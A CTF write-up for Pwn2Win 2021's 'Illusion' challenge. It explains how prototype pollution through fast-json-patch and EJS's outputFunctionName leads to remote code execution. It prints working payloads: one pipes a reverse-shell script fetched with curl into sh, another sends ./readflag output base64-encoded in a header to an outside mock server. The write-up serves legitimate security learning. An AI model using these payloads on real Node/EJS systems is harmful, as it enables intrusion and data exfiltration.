# :link: Pwn2Win 2021 CTF Writeup - Illusion

---

## Recon

In this challenge, I was given the source codes, complete with the Dockerfile. I was a bit clueless at the Dockerfile, so I just skimmed over the detail and more focused on the *composer.json* and the *index.js *(the main source code).

Right off the bat, I noticed something a bit peculiar. The Dockerfile placed its flag in */root/flag.txt*, therefore it’s supposed to be impossible to just read the flag directly. Fortunately, they also provided a binary named *readflag *to read the flag, so I implied that the intended vulnerability is RCE (Remote Code Execution).

Then, I examined the composer.json. There are some unique libraries that were included, such as [fast-json-patch](https://www.npmjs.com/package/fast-json-patch) and [express-basic-auth](https://www.npmjs.com/package/express-basic-auth). While express-basic-auth only used for authentication purpose in the website, the fast-json-patch here is pretty interesting, because it modified the data inside the *index.js*.

## Vulnerability

### Prototype Pollution

Suspecting the fast-json-patch library, I looked for its vulnerability. I found [this huntr link](https://www.huntr.dev/bounties/1-npm-fast-json-patch/) that refers to [this prototype pollution issue](https://github.com/Starcounter-Jack/JSON-Patch/issues/216). (Un)fortunately, the issue has been patched and the version used in the challenge also has been patched. But, when I see the issue page, I found that [there is a way](https://github.com/418sec/huntr/pull/768) to exploit the issue in different way.

To recap the bug, using the patch like this :

```
{op: "replace", path: "/constructor/prototype/polluted", value: "Yes! Its Polluted"}
```

would make the prototype of the object polluted.

### Prototype Pollution to RCE

Okay, so we could pollute the prototype for the *services* object. But how we could elevate the bug even further?

Let’s dive inside the template file. The template used are based on EJS (Embedded Javascript). In EJS, there is a property named *outputFunctionName* that could be used to execute arbitrary code. By default, we don’t have that property, but here’s when the prototype pollution come in handy.

With the help from [this post](https://xz.aliyun.com/t/7025), I could craft the post data like :

```
{"constructor/prototype/outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('curl [https://reverse-shell.sh/[My Server IP]:6969](https://reverse-shell.sh/104.236.234.197:6969) | sh');var __tmp2"}
```

I tested it on my local machine and it works, so it should works in the actual challenge machine, right?

## Execution

Not that easy!

I forgot that the challenge hosted in a Docker container. Therefore I spent quite some times debugging my exploit with the wrong assumption that my machine is as the same as the container.

After some times, I investigate the Dockerfile again, only this time I found some crucial information :

- I was logged in as guest instead of root, therefore I couldn’t write file in the readable directory.

- I just noticed that because the image used is node:alpine, the container don’t even have program like curl or wget to do a request to outside world, therefore it’s hard to do a request in the shell alone.

To confirm the limitation, I deployed the Dockerfile in my VPS. I also spent some times to find out how to deploy the image into a container since I have little experience with Docker. And yes, the limitation exists since I can’t write anything.

Given those constraints, I need to get creative. Since it’s really hard to smuggle the request in the shell, I tried to sent the request with http module in Node. So here’s my strategy :

- Import the HTTP module

- Execute the program with child_process.execSync()

- Encode the output into base64, since somehow it can’t handle the regular string

- Make a request, with the output as the value of a header.

- Send the request to my mock server.

Here’s my payload to send.

```
{"constructor/prototype/outputFunctionName":"_tmp1;console.log(global.process.mainModule.require('http').get('[http://rinrin.free.beeceptor.com'](http://rinrin.free.beeceptor.com'), {headers: {'User-Agent':global.process.mainModule.require('child_process').execSync('./readflag').toString('base64')}}));var __tmp2"}
```

So, first I call http.get() to make a request to my mock server at Beeceptor, then I put the output of my command in a header (in this case, User-Agent), and then encode it with base64. Finally, execute that request and retrieve the output in the mock server and decode it.

Long story short, I got the output and decode it, and finally got the flag.

## Flag

```
CTF-BR{d0nt_miX_pr0totyPe_pol1ution_w1th_a_t3mplat3_3ng1nE!}
```

## Conclusion

The beauty of CTF is that even if it’s only a challenge, you could learn a lot from it. The one thing I learned the most is that I should examine the Dockerfile before trying to debug the code. I spent almost 3 hours alone scratching my head just because the code work flawlessly in my local, but didn’t work in the challenge.

And also, the limitation of the base image is also pretty tricky if you aren’t careful. The image used, as I mentioned earlier, is node:alpine, a minimal Docker image for Node. Therefore, it’s understandable that they didn’t include curl and wget in the image.

This is my first post in Medium since I usually posted my writeup in my [Github](http://github.com/kerupuksambel/ctf-writeup/). Thanks for reading my post!

---
